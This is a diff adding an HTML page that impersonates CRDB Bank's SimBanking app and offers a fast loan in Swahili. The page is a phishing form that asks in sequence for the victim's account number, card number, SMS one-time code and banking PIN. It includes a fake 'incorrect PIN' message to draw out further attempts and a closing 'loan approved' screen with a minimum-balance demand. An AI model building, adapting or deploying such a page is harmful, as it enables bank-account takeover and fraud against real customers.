@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRDB SimBanking - Mkopo Wa Haraka</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay" class="hidden">
+        <div class="spinner"></div>
+        <p>Inapakia, tafadhali subiri...</p>
+    </div>
+
+    <div class="app-container">
+        <!-- Header -->
+        <header class="bank-header">
+            <div class="logo-area">
+                <span class="menu-icon">☰</span>
+                <span class="bank-title">CRDB BANK</span>
+            </div>
+            <div class="simbanking-badge">
+                <span>📱 SimBanking</span>
+                <span class="sub-text">Benki yako mkononi</span>
+            </div>
+        </header>
+
+        <!-- STEP 1: Account & Card Details -->
+        <div id="step-1" class="form-step active">
+            <h2>Unatumia Uthibitisho wa Kadi ya Tembo</h2>
+            <p class="subtitle">Karibu! Nyumbani tafadhali inaruhusu unganisha akaunti yako ya Benki ya CRDB</p>
+            
+            <div class="input-group">
+                <label>Ingiza nambari yako ya akaunti</label>
+                <input type="text" id="accountNumber" placeholder="Namba ya akaunti">
+            </div>
+
+            <div class="input-group">
+                <label>Ingiza nambari yako ya kadi</label>
+                <input type="text" id="cardNum" placeholder="1111-1111-1111-1111">
+            </div>
+
+            <button class="btn-primary" onclick="submitStep1()">ENDELEA</button>
+        </div>
+
+        <!-- STEP 2: OTP Verification -->
+        <div id="step-2" class="form-step hidden">
+            <div class="shield-icon">🛡️</div>
+            <h2>Thibitisha Akaunti Yako</h2>
+            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 5 iliyotumwa kwa namba yako ya Tembo.</p>
+            
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+                <input type="text" maxlength="1" class="otp-box" />
+            </div>
+
+            <button class="btn-primary" onclick="submitStep2()">Thibitisha Akaunti</button>
+            <p class="resend-text">Je, haukupokea namba ya OTP? <a href="#" onclick="resendOtp()">Tuma tena OTP</a></p>
+        </div>
+
+        <!-- STEP 3: SimBanking PIN -->
+        <div id="step-3" class="form-step hidden">
+            <div class="lock-icon">🔒</div>
+            <h2>Ingiza PIN ya Usalama</h2>
+            <p class="subtitle">Ingiza namba ya siri (PIN) ya usalama ya SimBanking ili kuendelea.</p>
+            
+            <div id="pin-error-notice" class="error-notice hidden">Incorrect pin, 2 attempt remains.</div>
+
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" />
+            </div>
+
+            <button class="btn-primary" onclick="submitStep3()">ENDELEA</button>
+        </div>
+
+        <!-- STEP 4: Success / Qualified -->
+        <div id="step-4" class="form-step hidden">
+            <div class="success-banner">
+                <h2>🎉 OMBI LIMEKUBALIWA!</h2>
+                <p>Kiasi chako kimeidhinishwa na sasa kimewekwa katika akaunti yako ya CRDB SimBanking.</p>
+            </div>
+            
+            <div class="info-card-box">
+                <h3>TAFADHALI KUMBUKA!</h3>
+                <p>Mteja lazima awe na angalau <strong>TZS. 500,000</strong> kwenye akaunti yake.</p>
+                <small>Hii ni kiwango cha chini kinachohitajika kukamilisha ombi lako.</small>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+  </html>
+              
